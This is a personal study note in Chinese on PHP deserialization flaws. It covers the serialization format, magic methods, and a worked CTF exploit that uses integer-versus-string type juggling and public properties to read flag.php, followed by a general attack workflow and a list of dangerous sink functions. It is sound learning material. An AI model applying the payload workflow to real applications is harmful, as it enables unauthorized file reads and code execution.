# 2026-08-10 PHP 反序列化入门

> 反序列化漏洞的核心不是序列化本身，而是解包时 PHP 自动触发的魔术方法。

---

## 一、是什么

### 1.1 序列化和反序列化

序列化：把内存中的对象转成一串字符串，方便传输或存文件。反序列化：把字符串还原成对象。

```php
$str = serialize($object);       // 对象 → 字符串（打包）
$obj = unserialize($string);     // 字符串 → 对象（解包）
```

### 1.2 类比

```
序列化   = 把乐高模型拆成零件装进快递盒
反序列化 = 收到快递，拆盒把零件拼回模型

漏洞点  = 快递盒里被人塞了一个机关，你一拆盒就自动触发了
        → 这个"自动触发"就是魔术方法
```

### 1.3 为什么会有漏洞

三个条件同时满足就构成反序列化漏洞：

```
① unserialize() 的参数用户可控（GET/POST/Cookie）
② 反序列化的类实现了魔术方法（__destruct / __wakeup 等）
③ 魔术方法内部的操作能被属性值影响（属性值又是攻击者构造的）
```

---

## 二、PHP 序列化格式详解

### 2.1 类型标记

PHP 的序列化是自有格式，不像 JSON 那样通用。每种类型有固定的标记：

| 标记 | 类型 | 格式 | 示例 |
|------|------|------|------|
| `O` | 对象 | `O:类名长度:"类名":属性数:{...}` | `O:6:"Person":2:{...}` |
| `s` | 字符串 | `s:长度:"内容";` | `s:4:"Tony";` |
| `i` | 整数 | `i:值;` | `i:20;` |
| `b` | 布尔 | `b:0;` 或 `b:1;` | `b:1;` |
| `d` | 浮点数 | `d:值;` | `d:3.14;` |
| `N` | null | `N;` | `N;` |
| `a` | 数组 | `a:元素数:{key;value;...}` | `a:2:{i:0;s:4:"abc";i:1;s:3:"def";}` |

### 2.2 手动解析一个序列化字符串

```php
O:6:"Person":2:{s:4:"name";s:4:"Tony";s:3:"age";i:20;}
│ │                 │                  │
│ │                 │                  └── 第二个属性 age = 20 (整数)
│ │                 └── 第一个属性 name = "Tony" (4 个字符的字符串)
│ └── 类名为 "Person"（6 个字符），有 2 个属性
└── Object（对象）
```

能看懂这个格式，就具备了手动构造 Payload 的能力——不需要依赖题目给出的类定义文件。

### 2.3 访问控制修饰符对序列化的影响

同一个属性的三种修饰符，序列化结果不同：

```php
class Test {
    public    $a = "public";     // 序列化: s:1:"a";s:6:"public";
    protected $b = "protected";  // 序列化: s:4:"\x00*\x00b";s:9:"protected";
    private   $c = "private";    // 序列化: s:8:"\x00Test\x00c";s:7:"private";
}
```

| 修饰符 | 序列化属性名 | null byte 数量 | 说明 |
|--------|-------------|:---:|------|
| public | `a` | 0 | 属性名原样输出 |
| protected | `\x00*\x00b` | 2 | 两边加 `\x00*` 和 `\x00` |
| private | `\x00Test\x00c` | 2 | 两边加 `\x00类名` 和 `\x00` |

`\x00` 是 ASCII 码 0（null byte），不可见字符。在 Burp 里看是空格，在代码里用 `%00` 表示。这就是为什么很多题目会对输入做过滤——专门过滤 `\x00` 来防御反序列化攻击。但防御可以通过改用 `public` 来解决。

---

## 三、反序列化相关的魔术方法

PHP 中以 `__` 开头的魔术方法会在特定时机被自动调用，不需要手动 `$obj->method()`。

### 3.1 和反序列化直接相关的方法

| 魔术方法 | 触发时机 | 在反序列化中的作用 |
|---------|---------|------------------|
| `__wakeup()` | `unserialize()` 调用后**立即**执行 | 最早执行的入口，常用于重新连接数据库等初始化。攻击者可以在这里做文章。 |
| `__destruct()` | 对象被销毁时（脚本结束、unset()、被覆盖） | **最常用的攻击入口**。脚本结束时所有对象都会销毁，不用管调用链，一定会触发。 |
| `__toString()` | 对象被当成字符串使用时（echo / 拼接） | 如果某处代码 `echo $obj`，就触发。可以配合输出函数把数据带出来。 |
| `__sleep()` | `serialize()` 调用前触发 | 序列化时触发，和漏洞利用关系不大，但可以用来做反序列化 payload 的调试。 |

### 3.2 其他重要魔术方法

| 魔术方法 | 触发时机 | 利用场景 |
|---------|---------|---------|
| `__construct()` | `new` 创建对象时 | ⚠️ **注意：unserialize() 不会触发 `__construct()`**。这是个常见误区。 |
| `__call($name, $args)` | 调用对象的不存在方法时 | 如果代码里有 `$obj->xxx()` 且 xxx 不存在，触发 |
| `__get($name)` | 读取对象的不可访问属性时 | `echo $obj->secret;` 但 secret 是 protected/private 且不在当前上下文 |
| `__set($name, $value)` | 给不可访问属性赋值时 | `$obj->secret = "xxx"` |
| `__isset($name)` | 对不可访问属性调用 `isset()` 或 `empty()` 时 | |
| `__unset($name)` | 对不可访问属性调用 `unset()` 时 | |
| `__invoke()` | 把对象当函数调用时 | `$obj()` → 触发。可在回调函数场景中利用。 |
| `__clone()` | `clone` 对象时 | 较少用于反序列化 |

### 3.3 各魔术方法的触发顺序

```php
// 反序列化时
$obj = unserialize($str);
// → 先触发 __wakeup()

// 脚本结束时
// → 触发 __destruct()
```

```php
// 序列化时（参考，不重要）
$str = serialize($obj);
// → 先触发 __sleep()（如果实现了）
```

**一句话记住**：反序列化攻击链的起点，不是 `__wakeup()` 就是 `__destruct()`。

---

## 四、完整攻击链：一道 CTF 真题拆解

### 4.1 题目代码

```php
<?php

include("flag.php");          // 目标：读到 flag

class FileHandler {
    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {          // 分支 A：写文件
            $this->write();
        } else if($this->op == "2") {   // 分支 B：读文件
            $res = $this->read();
            $this->output($res);        // ← 目标：走到这行，输出 flag
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() { ... }     // 往 $this->filename 写 $this->content
    private function read() {
        return file_get_contents($this->filename);  // ← 读文件
    }
    private function output($s) { echo $s; }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";             // ← 看似阻止了读文件
        $this->content = "";
        $this->process();                // ← 最终会调用 process()
    }
}

$str = (string)$_GET['str'];             // ← 用户输入
if(is_valid($str)) {                     // ← 过滤：只允许可打印 ASCII 字符
    $obj = unserialize($str);            // ← 漏洞入口
}
```

### 4.2 Step 1：找 unserialize 入口

```php
$str = (string)$_GET['str'];    // 从 URL 参数取
$obj = unserialize($str);       // 直接反序列化 → 入口点确认
```

### 4.3 Step 2：找魔术方法

`__destruct()` — 对象销毁时自动调用。

```php
function __destruct() {
    if($this->op === "2")       // ← 这里用 ===
        $this->op = "1";
    $this->content = "";
    $this->process();           // ← 调用 process()
}
```

`process()` 有两个分支：`op == "1"` 写文件，`op == "2"` 读文件。目标是走进 `read()`。

### 4.4 Step 3：找绕过点

`__destruct()` 里做了保护——如果是字符串 `"2"`，就改成 `"1"`。但这里用了 `===`（严格比较），而 `process()` 里用了 `==`（松散比较）。

**PHP 弱类型比较：**

```php
// 严格比较 === ：类型和值都要相同
2 === "2"   → false   // 一个是整数，一个是字符串
2 === 2     → true

// 松散比较 == ：PHP 自动转换类型
2 == "2"    → true    // PHP 把 "2" 转为数字 2，然后比较
2 == 2      → true
```

利用方式：传**整数 2**而不是字符串 `"2"`：

| | `__destruct()` (`===` "2") | `process()` (`==` "2") |
|--|:--:|:--:|
| 传字符串 "2" | ✅ 匹配，被改成 "1" | ✅ 匹配 |
| 传整数 2 | ❌ 不匹配，绕过保护 | ✅ 匹配，走读文件分支 |

**本质原因**：同一套数据被两个不同严谨度的判断条件检验，利用差异钻空子。

### 4.5 Step 4：绕过 is_valid() 过滤

```php
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))  // 32~125 = 可打印 ASCII
            return false;
    return true;
}
```

题目的类定义是 `protected` 属性，序列化会带 `\x00`（ord=0 < 32），被过滤拦住了。

**解决**：本地构造 Payload 时把属性声明为 `public`。`public` 不带 `\x00`。

### 4.6 Step 5：构造 Payload

```php
<?php
class FileHandler {
    public $op = 2;              // 整数 2，不是字符串 "2"
    public $filename = "flag.php";
    public $content = "";
}

$obj = new FileHandler();
echo urlencode(serialize($obj));
?>
```

运行得到 URL 编码后的字符串，拼接到 `?str=` 后面，访问即可。

### 4.7 攻击链回顾

```
?str=构造好的序列化字符串
    ↓
is_valid() 通过（public 属性没有 null byte）
    ↓
unserialize($_GET['str'])
    ↓
脚本结束 → 所有对象销毁 → __destruct() 自动调用
    ↓
$this->op = 2（整数），2 === "2" → false，绕过保护
    ↓
$this->process()
    ↓
$this->op == "2" → true（松散比较），走 read() 分支
    ↓
file_get_contents("flag.php") → 读取 flag
    ↓
output() 输出到页面 → 在源码里看到 flag
```

---

## 五、通用攻击流程

拿到一个 PHP 反序列化入口，按这个顺序查：

```
① 找 unserialize
   搜关键字 unserialize(  → 参数来源是 GET / POST / COOKIE？
   如果能控制参数 → 入口确认

② 找魔术方法
   优先看 __destruct()（一定有，脚本结束就触发）
   再看 __wakeup()（unserialize 后立即触发）
   其次看 __toString() / __call() / __get() / __set()

③ 追踪调用链
   从魔术方法出发 → 顺藤摸瓜看它调了什么函数
   画调用路径：__destruct() → xxx() → yyy() → 危险函数
   
④ 找危险函数终点
   命令执行：system() exec() shell_exec() passthru() popen() `` (反引号)
   文件操作：file_get_contents() file_put_contents() include() unlink()
   代码执行：eval() assert() call_user_func() create_function()

⑤ 找类型/逻辑绕过
   严格比较 === 和松散比较 == 的行为差异
   类型转换钻空子（strlen 对 null byte、intval 对字符串）
   过滤逻辑有没有覆盖不到的字符

⑥ 构造 Payload
   本地建同名类 → 设属性值 → serialize() → urlencode()
   属性优先用 public（避免 null byte）
   用本地 PHP 环境先自己反序列化验证结构正确
```

---

## 六、常见错误排查

| 现象 | 可能的原因 |
|------|-----------|
| 页面完全没变化 | Payload 被过滤了（null byte / 特殊字符），根本没走到 unserialize |
| 页面报错 | 类名或属性名拼错了，或者属性类型不对（传了字符串但需要整数） |
| 走错分支 | `===` 和 `==` 没利用好，或者属性值设置不对 |
| 读不到文件 | 路径写错了（`flag.php` / `./flag.php` / `../flag.txt`），或者权限不够 |

---

## 七、相关概念

### 7.1 POP 链（Property Oriented Programming）

真实框架中不会有一个现成的类直接执行 `system()`。攻击者需要利用框架中多个类的方法调用关系，把它们串成一条链——每个类都只做一件小事（比如 A 调用 B，B 又调用了 C），链的末端是危险函数。

```
对象属性 A → 触发 A 的 __destruct() → 调用 B 的方法
  → B 的方法又触发 C 的 __toString() → C 执行了危险函数
```

这是反序列化漏洞最复杂的部分，先知道概念，后续专门练。

### 7.2 Phar 反序列化

PHP 的 Phar（PHP Archive）文件格式在解析时，会自动对文件内部的 metadata 做反序列化。即使代码里没有明显的 `unserialize()` 调用，只要用了 `include()`、`file_exists()`、`fopen()` 等文件操作函数处理 `.phar` 文件，就可能触发反序列化。

### 7.3 其他语言的序列化漏洞

```
PHP   → unserialize() → 魔术方法链
Java  → ObjectInputStream.readObject() → Gadget Chain
Python → pickle.loads() → __reduce__()
```

本质一样：解包时自动触发方法，属性值可控。

---

## 总结

| 要点 | 一句话 |
|------|--------|
| 序列化本质 | 对象 → 字符串，方便传输 |
| 漏洞根因 | 反序列化时自动触发魔术方法，且属性值被攻击者控制 |
| 最常用入口 | `__destruct()` — 脚本结束时必然触发 |
| 次常用入口 | `__wakeup()` — unserialize 后立即触发 |
| PHP 弱类型 | `==` vs `===` 的行为差异，是绕过逻辑的常见手段 |
| public vs protected | protected/private 序列化带 `\x00`，绕过过滤就改用 public |
| 通用思路 | 入口 → 魔术方法 → 调用链 → 危险函数 → 类型绕过 → 构造 Payload |

---

## 关联笔记

- [Token 安全与防护绕过](./2026-08-10-Token安全与防护绕过.md) — JWT 的序列化篡改（Base64 解码 → 改 Payload → 重签名）
- [验证码安全与绕过技术](./2026-08-10-验证码安全与绕过技术.md) — 同天学的，绕过思维是共通的
- [文件包含漏洞详解](./2026-08-05-文件包含漏洞详解.md) — `file_get_contents()` / `include()` 是反序列化链常见的危险函数终点

## 待实践

- [ ] 本地写一个带 `__destruct()` 的 PHP 类，手写序列化字符串触发反序列化漏洞
- [ ] CTFHub 反序列化技能树从头刷
- [ ] BUUCTF 搜索"反序列化"，从低难度开始
- [ ] 自己改题目的 `is_valid()` 过滤规则（比如放宽到允许更多字符），看 Payload 要怎么调整

> ⚠️ 声明：以上技术仅用于 CTF 竞赛和授权靶场环境。
